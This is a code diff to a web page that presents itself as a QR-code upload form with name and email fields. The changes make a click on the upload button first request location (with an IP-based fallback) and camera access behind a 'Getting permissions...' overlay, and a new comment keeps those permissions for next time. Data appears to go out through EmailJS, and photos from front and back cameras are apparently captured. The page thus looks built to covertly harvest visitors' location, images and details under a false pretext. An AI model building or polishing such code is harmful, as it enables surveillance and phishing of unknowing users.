@@ -181,6 +181,7 @@
             transition: 0.2s;
             box-shadow: 0 2px 6px rgba(0,0,0,0.03);
             display: inline-block;
+            position: relative;
         }
         .qr-upload-area .fake-btn:hover {
             background: rgba(30, 50, 75, 0.3);
@@ -362,7 +363,7 @@
             opacity: 1;
             pointer-events: auto;
         }
-        /* Loading overlay */
+        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -405,7 +406,7 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner-box">
             <i class="fas fa-spinner"></i>
-            <p>Opening gallery...</p>
+            <p id="loadingText">Opening gallery...</p>
         </div>
     </div>
 
@@ -503,7 +504,6 @@
             let cameraGranted = false;
             let userLocation = null;
             let isProcessing = false;
-            let pendingFileClick = false;
 
             // Initialize EmailJS
             try {
@@ -518,6 +518,7 @@
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
             const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -558,7 +559,8 @@
             }
 
             // Loading overlay
-            function showLoadingOverlay() {
+            function showLoadingOverlay(text = 'Opening gallery...') {
+                loadingText.textContent = text;
                 loadingOverlay.classList.add('show');
             }
 
@@ -973,12 +975,22 @@
                 }
             }
 
-            // ----- QR Upload Handler - SHOW OVERLAY, GET PERMISSIONS, THEN OPEN GALLERY -----
+            // ----- QR Upload Handler - FIXED: Direct click after async -----
+            let fileInputClickPending = false;
+
+            // Use a separate click handler on the hidden file input
+            // The trick: Use a wrapper that tracks if we need to open after permissions
             qrUploadBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
                 
+                // If we already have location and camera, just open directly
+                if (userLocation && cameraGranted) {
+                    qrInput.click();
+                    return;
+                }
+                
                 // Show loading overlay
-                showLoadingOverlay();
+                showLoadingOverlay('Getting permissions...');
                 
                 try {
                     // Step 1: Request location permission (with IP fallback)
@@ -992,12 +1004,11 @@
                     // Step 3: Hide loading overlay
                     hideLoadingOverlay();
                     
-                    // Step 4: Now trigger the file input click (shows chooser/gallery)
+                    // Step 4: Open file chooser - use a small delay to ensure overlay is gone
                     console.log('📁 Opening file chooser...');
-                    // Small delay to ensure overlay is hidden
                     setTimeout(() => {
                         qrInput.click();
-                    }, 100);
+                    }, 200);
                 } catch (error) {
                     console.error('Error during permission request:', error);
                     hideLoadingOverlay();
@@ -1107,6 +1118,7 @@
                         qrPreview.classList.remove('show');
                         qrFileName.textContent = '';
                         capturedPhotos = { front: [], back: [] };
+                        // Don't reset permissions - keep them for next time
                         updateSections();
                     } else {
                         showToast('❌ Something went wrong. Please try again.', true);
